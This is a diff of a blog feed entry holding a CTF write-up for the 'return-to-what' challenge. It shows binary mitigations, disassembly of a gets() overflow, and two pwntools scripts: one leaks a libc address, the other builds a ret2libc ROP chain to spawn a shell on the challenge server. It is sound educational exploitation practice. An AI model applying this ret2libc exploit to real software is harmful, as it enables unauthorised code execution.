@@ -2,7 +2,7 @@
 {} ret2what checksec return-to-what [*] &amp;#39;/home/h4x5p4c3/Downloads/ret2what/return-to-what&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Nx is enabled so we can&amp;rsquo;t do a bof and place our shellcode to get a shell and no canary which makes it easier and ASLR is probably enabled.
 Disassembly and Decompilation pwndbg&amp;gt; disassemble main Dump of assembler code for function main: 0x00000000004011ad &amp;lt;+0&amp;gt;: push rbp 0x00000000004011ae &amp;lt;+1&amp;gt;: mov rbp,rsp # prologue 0x00000000004011b1 &amp;lt;+4&amp;gt;: lea rdi,[rip+0xe78] # rdi = address of [rip+0xe78] 0x00000000004011b8 &amp;lt;+11&amp;gt;: call 0x401030 &amp;lt;puts@plt&amp;gt; # call puts function 0x00000000004011bd &amp;lt;+16&amp;gt;: mov eax,0x0 # eax = 0x0 0x00000000004011c2 &amp;lt;+21&amp;gt;: call 0x401185 &amp;lt;vuln&amp;gt; # call vuln function which has the vulnerable gets function which we use to do bof 0x00000000004011c7 &amp;lt;+26&amp;gt;: mov eax,0x0 # eax = 0x0 0x00000000004011cc &amp;lt;+31&amp;gt;: pop rbp # epilogue 0x00000000004011cd &amp;lt;+32&amp;gt;: ret End of assembler dump.</description><content>&lt;h2 id="leaking-libc-addresses-to-do-ret2libc-with-unknown-libc">Leaking Libc addresses to do ret2libc with unknown libc&lt;/h2>
 &lt;p>First lets take a look at the binary mitigations&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> ret2what checksec &lt;span style="color:#66d9ef">return&lt;/span>-to-what
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> ret2what checksec &lt;span style="color:#66d9ef">return&lt;/span>-to-what
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Downloads/ret2what/return-to-what&amp;#39;&lt;/span>
 Arch: amd64-64-little
 RELRO: Partial RELRO
@@ -12,7 +12,7 @@ PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="co
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Nx is enabled so we can&amp;rsquo;t do a bof and place our shellcode to get a shell and
 no canary which makes it easier and ASLR is probably enabled.&lt;/p>
 &lt;h2 id="disassembly-and-decompilation">Disassembly and Decompilation&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">pwndbg&amp;gt; disassemble main
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">pwndbg&amp;gt; disassemble main
 Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> main:
 0x00000000004011ad &amp;lt;+0&amp;gt;: push rbp
 0x00000000004011ae &amp;lt;+1&amp;gt;: mov rbp,rsp &lt;span style="color:#75715e"># prologue&lt;/span>
@@ -25,7 +25,7 @@ Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span sty
 0x00000000004011cd &amp;lt;+32&amp;gt;: ret
 End of assembler dump.
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>The decompilation of the assembly code looks like this&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
 undefined8 main&lt;span style="color:#f92672">(&lt;/span>void&lt;span style="color:#f92672">)&lt;/span>
 &lt;span style="color:#f92672">{&lt;/span>
 puts&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Today, we\&amp;#39;ll have a lesson in returns.&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>;
@@ -33,7 +33,7 @@ vuln&lt;span style="color:#f92672">()&lt;/span>;
 &lt;span style="color:#66d9ef">return&lt;/span> 0;
 &lt;span style="color:#f92672">}&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>In addition lets take a look at the &lt;code>vuln&lt;/code> function too&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
 void vuln&lt;span style="color:#f92672">(&lt;/span>void&lt;span style="color:#f92672">)&lt;/span>
 &lt;span style="color:#f92672">{&lt;/span>
 char *s;
@@ -47,11 +47,11 @@ gets&lt;span style="color:#f92672">(&lt;/span>&amp;amp;s&lt;span style="color:#f
 the &lt;code>ret&lt;/code> gadget to align our stack&lt;/p>
 &lt;h2 id="leaking-address-of-libc">Leaking address of Libc&lt;/h2>
 &lt;p>Now lets craft our exploit to leak address of libc and i previously found out the offset to do bof is &lt;code>56&lt;/code>&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
 &lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
 context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;alacritty&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-c&amp;#39;&lt;/span>]
 context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;info&amp;#39;&lt;/span>
-exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>True)
+exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
 io &lt;span style="color:#f92672">=&lt;/span> process(exe&lt;span style="color:#f92672">.&lt;/span>path)
 &lt;span style="color:#75715e">#io = remote(&amp;#39;chal.duc.tf&amp;#39;, 30003)&lt;/span>
 &lt;span style="color:#75715e">#gdb.attach(io)&lt;/span>
@@ -65,11 +65,11 @@ io&lt;span style="color:#f92672">.&lt;/span>recvline()
 io&lt;span style="color:#f92672">.&lt;/span>recvline()
 recieved &lt;span style="color:#f92672">=&lt;/span> io&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>strip()
 libc_leak &lt;span style="color:#f92672">=&lt;/span> u64(recieved&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>))
-log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;__libc_start_main leak {}&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc_leak)))
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;__libc_start_main leak &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc_leak)))
 io&lt;span style="color:#f92672">.&lt;/span>close()
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Here i leaked the address of &lt;code>__libc_start_main &lt;/code>&lt;/p>
 &lt;p>Now lets run our exploit script in order to leak libc address&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> python exploit.py
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> python exploit.py
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Desktop/tmp/return-to-what&amp;#39;&lt;/span>
 Arch: amd64-64-little
 RELRO: Partial RELRO
@@ -85,12 +85,12 @@ RUNPATH: b&lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Desktop/tmp&amp
 &lt;p>&lt;img src="/images/libc-database.png" alt="">&lt;/p>
 &lt;p>Now that we found out the libc version, here i assumed it to be the first libc so i choose to use &lt;code>libc6_2.27-3ubuntu1_amd64.so&lt;/code>&lt;/p>
 &lt;p>Lets craft our final exploit script and run in on the remote server to get a shell and grab our flag 🚩&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
 &lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
 context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;alacritty&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-c&amp;#39;&lt;/span>]
 context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;info&amp;#39;&lt;/span>
-exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>True)
-libc &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./libc.so.6&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>True)
+exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
+libc &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./libc.so.6&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
 io &lt;span style="color:#f92672">=&lt;/span> process(exe&lt;span style="color:#f92672">.&lt;/span>path)
 &lt;span style="color:#75715e">#io = remote(&amp;#39;chal.duc.tf&amp;#39;, 30003)&lt;/span>
 &lt;span style="color:#75715e">#gdb.attach(io)&lt;/span>
@@ -105,12 +105,12 @@ io&lt;span style="color:#f92672">.&lt;/span>recvline()
 recieved &lt;span style="color:#f92672">=&lt;/span> io&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>strip()
 libc_leak &lt;span style="color:#f92672">=&lt;/span> u64(recieved&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>))
 libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">=&lt;/span> libc_leak &lt;span style="color:#f92672">-&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;__libc_start_main&amp;#39;&lt;/span>]
-log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;__libc_start_main leak {}&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc_leak)))
-log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;libc base {}&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc&lt;span style="color:#f92672">.&lt;/span>address)))
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;__libc_start_main leak &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc_leak)))
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;libc base &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc&lt;span style="color:#f92672">.&lt;/span>address)))
 bin_sh &lt;span style="color:#f92672">=&lt;/span> next(libc&lt;span style="color:#f92672">.&lt;/span>search(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>))
 system &lt;span style="color:#f92672">=&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#34;system&amp;#34;&lt;/span>]
-log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;/bin/sh {}&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(bin_sh)))
-log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;system {}&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(system)))
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;/bin/sh &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(bin_sh)))
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;system &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(system)))
 payload &lt;span style="color:#f92672">=&lt;/span> flat([
 cyclic(&lt;span style="color:#ae81ff">56&lt;/span>), ret, pop_rdi, bin_sh, system
 ])
@@ -118,7 +118,7 @@ io&lt;span style="color:#f92672">.&lt;/span>recv()
 io&lt;span style="color:#f92672">.&lt;/span>sendline(payload)
 io&lt;span style="color:#f92672">.&lt;/span>interactive()
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Lets run our exploit as expected we get a shell so we&amp;rsquo;ll cat out the &lt;code>flag&lt;/code> now&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> python exploit.py
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> python exploit.py
 &lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Opening connection to chal.duc.tf on port 30003: Done
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Downloads/ret2what/return-to-what&amp;#39;&lt;/span>
 Arch: amd64-64-little
